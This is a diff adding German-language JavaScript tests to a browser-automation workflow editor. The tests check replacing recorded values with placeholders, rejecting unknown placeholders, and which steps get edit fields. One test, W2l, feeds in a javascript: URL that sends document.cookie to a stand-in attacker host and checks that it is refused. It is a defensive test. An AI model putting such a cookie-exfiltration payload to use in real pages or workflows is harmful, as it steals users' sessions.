@@ -160,6 +160,24 @@ const ZWEITER = Object.freeze({
   steps: [{ type: "navigate", url: "https://geizhals.de/", wait: "load" }],
 });
 
+/*
+ * Ein Ablauf, wie ihn der Rekorder hinterlaesst: Der Wert steht woertlich
+ * darin, so wie er beim Aufzeichnen im Formular stand. Genau dieser Zustand
+ * war am 14.08.2026 die Sackgasse (M9) — der Mensch konnte `1234567890`
+ * nirgends durch `{{artikelnummer}}` ersetzen.
+ */
+const AUFGEZEICHNET = Object.freeze({
+  id: "wf_ebay_aufnahme",
+  name: "eBay: aufgezeichnet",
+  version: 1,
+  params: ["artikelnummer"],
+  steps: [
+    { type: "navigate", url: "https://www.ebay.de/sh/lst/ended", wait: "networkidle" },
+    { type: "click", selector_cascade: ["[data-testid='relist']"] },
+    { type: "input", selector_cascade: ["#itemnr"], value: "1234567890" },
+  ],
+});
+
 /* Die drei Angriffe aus dem Auftrag, jeder in einer eigenen Datei. */
 const BOESE = Object.freeze({
   schritttyp: {
@@ -487,6 +505,104 @@ test("W2g: Ein leerer Name kommt gar nicht erst in die Ablage", async () => {
   const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
   assert.equal(abgelegt[0].name, ABLAUF.name);
   assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false);
+});
+
+/* ------------------------------------------------------------------ *
+ * W2i bis W2l — Fund M9 der Abnahme vom 14.08.2026
+ *
+ * Der Mensch konnte Platzhalter-NAMEN anlegen und Schritte verschieben oder
+ * loeschen, aber den aufgezeichneten Wert nirgends ersetzen. Damit war die
+ * Parametrisierung aus Feature 3 gebaut und fuer einen Menschen nicht
+ * erreichbar. Gemessen wird deshalb der Weg ueber das Bedienelement und nicht
+ * ueber die Funktion dahinter.
+ * ------------------------------------------------------------------ */
+
+test("W2i: Der aufgezeichnete Wert laesst sich durch einen Platzhalter ersetzen", async () => {
+  const { griff, welt } = await werkbankBauen({
+    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
+  });
+  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
+
+  const felder = mitKlasse(griff.wurzel, "sa-wb-wert");
+  assert.ok(felder.length, "es gibt ueberhaupt ein Bedienelement fuer den Wert");
+  const eintippen = felder.find((f) => f.value === "1234567890");
+  assert.ok(eintippen, `der aufgezeichnete Wert steht darin: ${felder.map((f) => f.value)}`);
+  assert.ok(eintippen.getAttribute("aria-label"), "und das Feld sagt, zu welchem Schritt es gehoert");
+
+  eintippen.value = "{{artikelnummer}}";
+  await eintippen.ausloesen("change");
+
+  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
+  assert.equal(abgelegt[0].steps[2].value, "{{artikelnummer}}", "und zwar wirklich in der Ablage");
+
+  /* Und danach laesst sich der Ablauf mit einem Wert abspielen — das ist der
+     ganze Zweck der Uebung. */
+  const gefuellt = werkstatt.platzhalterFuellen(abgelegt[0], { artikelnummer: "9988776655" });
+  assert.equal(gefuellt.ok, true);
+  assert.equal(gefuellt.workflow.steps[2].value, "9988776655");
+});
+
+test("W2j: Ein Platzhalter, den der Ablauf nicht kennt, wird benannt abgelehnt", async () => {
+  const { griff, welt } = await werkbankBauen({
+    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
+  });
+  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
+  const feld = mitKlasse(griff.wurzel, "sa-wb-wert").find((f) => f.value === "1234567890");
+
+  feld.value = "{{gutschein}}";
+  await feld.ausloesen("change");
+
+  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
+  assert.equal(abgelegt[0].steps[2].value, "1234567890", "gespeichert wird nichts");
+  const hinweis = eins(griff.wurzel, "sa-wb-hinweis");
+  assert.equal(hinweis.hidden, false);
+  assert.match(hinweis.textContent, /gutschein/i, "und der Satz nennt den Platzhalter beim Namen");
+
+  /* Im Feld steht danach wieder der Wert, der WIRKLICH gespeichert ist — sonst
+     glaubte der Mensch, seine Aenderung sei angekommen. */
+  const jetzt = mitKlasse(griff.wurzel, "sa-wb-wert").find((f) => f.getAttribute("aria-label")?.includes("Eintippen"));
+  assert.equal(jetzt.value, "1234567890");
+});
+
+test("W2k: Nur Schritte mit einem Wert bekommen ein Feld, die anderen keines", async () => {
+  const { griff } = await werkbankBauen({
+    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
+  });
+  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
+
+  /* navigate (Adresse) und input (Text) ja, click nein: Ein Anker von Hand zu
+     tippen waere kein Parametrisieren, sondern ein zweiter Weg, einen Ablauf
+     auf ein Element zu richten, das niemand aufgezeichnet hat. */
+  assert.equal(mitKlasse(griff.wurzel, "sa-wb-wert").length, 2);
+  assert.equal(werkbank.wertFeld({ type: "click", selector_cascade: ["#a"] }), null);
+  assert.equal(werkbank.wertFeld({ type: "user_input_required", reason: "Login/2FA" }), null);
+  assert.equal(werkbank.wertFeld({ type: "input", selector_cascade: ["#a"], value: "x" }), "value");
+  assert.equal(werkbank.wertFeld({ type: "navigate", url: "https://a.de/" }), "url");
+
+  /* Und wer die Funktion trotzdem auf einen Schritt ohne Wert richtet,
+     bekommt eine benannte Absage statt einer Ausnahme. */
+  const raus = werkbank.wertSetzen(AUFGEZEICHNET, 1, "irgendwas");
+  assert.equal(raus.ok, false);
+  assert.equal(raus.code, "schritt_ohne_wert");
+});
+
+test("W2l: Eine Adresse, die kein Schema mehr hat, kommt nicht in die Ablage", async () => {
+  /* Der Wert geht durch dieselbe Positivliste wie jede andere Quelle. Ein
+     `javascript:` in einer Adresse ist kein Ablauf, sondern fremder Code mit
+     einem Sprungbrett. */
+  const { griff, welt } = await werkbankBauen({
+    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
+  });
+  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
+  const adresse = mitKlasse(griff.wurzel, "sa-wb-wert").find((f) => f.value.startsWith("https://"));
+  assert.ok(adresse, "Vorbedingung: die Adresse steht in einem Feld");
+
+  adresse.value = "javascript:fetch('https://boese.example/'+document.cookie)";
+  await adresse.ausloesen("change");
+
+  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
+  assert.equal(abgelegt[0].steps[0].url, AUFGEZEICHNET.steps[0].url, "der Ablauf bleibt, wie er war");
+  assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false, "und der Grund steht da");
 });
 
 test("W2h: Loeschen entfernt wirklich aus der Ablage", async () => {
